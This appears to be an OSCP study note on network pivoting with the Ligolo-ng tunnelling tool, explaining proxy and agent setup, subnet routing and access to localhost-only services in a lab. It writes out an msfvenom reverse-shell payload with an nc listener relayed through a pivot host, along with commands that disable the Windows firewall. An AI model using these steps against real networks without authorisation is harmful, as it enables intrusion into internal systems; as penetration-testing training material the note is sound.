# Ligolo-ng

## When do you use ligolo?

- When you need to access a different subnet from your kali machine; For OSCP this means the AD Set where the DC and the 2nd AD machine will be on a different subnet from your kali

- When you want to access an internal service on a host; usually these are services that are not exposed or services like SQL, MSSQL that only allow logins from localhost

## How does it work?

- This is my layman understanding so happy to be corrected. Ligolo-ng creates a tunnel via the pivot machine (or agent) to allow you to access another subnet. Think of it like a VPN. This is unlike Chisel which uses SOCKS.

- You have a proxy which is your kali and your agent which is the pivot machine

- As such, ligolo-ng is my preference for the OSCP because it is just really good and much faster than something like Chisel where you have to use proxychains and everything slows down to a crawl (esp Nmap scans)

- That said, you should still learn Chisel as an alternative tool

## The Most Common Use Case: For Pivoting into Internal Network

![alt text](/Assets/Basic_ligolo.png)

Now using my piece of art above to explain.

**Scenario**

- You gotten a foothold on MS01. A low level user is sufficient for Ligolo. Now you want to access MS02 from your kali.

- You transfer agent.exe onto MS01 via certutil, or Invoke-WebRequest or mounting a smb share or using evil-winrm upload function.

- On your kali, you set up a listener like this

```bash
sudo ./proxy -selfcert

# create a name for your interface(tunnel)
ifcreate --name ligolo
```
- You notice that the proxy started and is listening on 0.0.0.0:11601. By default, the proxy listens on port 11601 but you can define your own port if you want by:

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:<port of your choice>
```

- most of the time 11601 is fine but sometimes you may face firewall issues on MS01 which prevents outbound traffic on 11601. You can use something like 53, 80 or 443 which should be exempted from firewall rules.

- okay now your proxy is set up. On MS01, run the following command to connect your agent to the proxy

```cmd

agent.exe -connect 192.168.1.10:11601 -ignore-cert

```

- if all goes smoothly, you should see an agent connected on your proxy. To set up the tunnel, you then run the following commands on your proxy:

```bash

session # choose the session of the agent that connected

route_add --name ligolo --route 10.10.1.0/24  # define the subnet you want to access

start

```

- bingo you can now access the 10.10.1.0/24 subnet!

### What if I want a reverse shell back from MS02 to my kali?

- in some cases, you may want to get a reverse shell back to kali. But you cant just run a msfvenom payload on MS02 with the LHOST being 192.168.1.10 because MS02 has no idea where the 192.68.1.0/24 subnet is and as such your rev shell will fail

- But MS02 knows where MS01 is. So the idea is to have MS01 port fwd incoming connections from MS02 to the kali machine!

- Now assuming you set up the tunnel, what you need to do is to add a listener on the MS01 agent. On your proxy, do the following:

```bash
[Agent : corp.com\peter@MS01] » listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443 --tcp
```

- what the above does is tell the agent MS01 to forward any traffic they receive from port 443 and push it out the other side on port 443. This works bidrectional btw. 

- Ports that are already hosting a service cannot be used (eg. there is a HTTP server up on the target at port 80, which means you cannot bind 0.0.0.0:80).
  This goes the same for your own services (eg. SMB server on Kali's port 445, which prevents you from binding a listener on 127.0.0.1:445)

*You can add listeners and routes while the session has started, so don't worry if you did not execute this part in order

- with this you can get a reverse shell by getting MS02 to connect to MS01 on port 443 who will then forward the traffic to kali on port 443 so:

```bash

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.20 LPORT=443 -f exe > rev.exe

# set up listener on kali

rlwrap nc -lvnp 443

# upload this file to MS02 and execute it. You should get a rev shell!

```

- Again why port 443 is chosen is due to likely firewall rules exempting port 443 from outbound traffic. That said, if you can get Admin on MS01 you can just disable the firewall and use any ports you like for forwarding on MS01. You can do this on MS01 with the following command:

```cmd
netsh advfirewall set allprofiles state off

#powershell equivalent

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

```

## The Other Scenario: Assessing local services on the host

What if there are services that are either only running on localhost or accept connections from localhost?

You can also use ligolo for this. Set up the proxy and then get the agent connected. The only difference is the route_add

Ligolo reserves the 240.0.0.1 subnet for accessing the agent's localhost. 

**Scenario**

In this case, MS01 has an internal web server on port 8080. You want to access this web server from kali.

```bash
# after selecting the agent session

route_add --name ligolo --route 240.0.0.1/32

start
```

You can now curl or browse to that local webserver via http://240.0.0.1:8080